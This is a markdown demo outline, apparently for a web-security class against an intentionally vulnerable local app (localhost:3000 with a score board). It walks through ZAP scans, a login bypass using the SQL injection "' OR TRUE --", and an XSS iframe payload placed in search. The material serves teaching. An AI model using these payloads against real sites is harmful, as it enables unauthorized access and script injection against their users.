### Demos

1. Browse website

```
http://localhost:3000
```
```
http://localhost:3000/#/score-board
```

2. Launch Owasp Zed Attack Proxy
    1. Run automated tests
    2. Run manual tests

3. Login with admin credentials
    1. Find out sql query
    ```
    username: '
    password: password
    ```
    2. Examine response

    3. Login through sql injection
    ```
    username: ' OR TRUE --
    password: password
    ```
4. Inject XSS attack in search
```
<iframe src="javascript:alert(`xss`)">
```

```
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
```


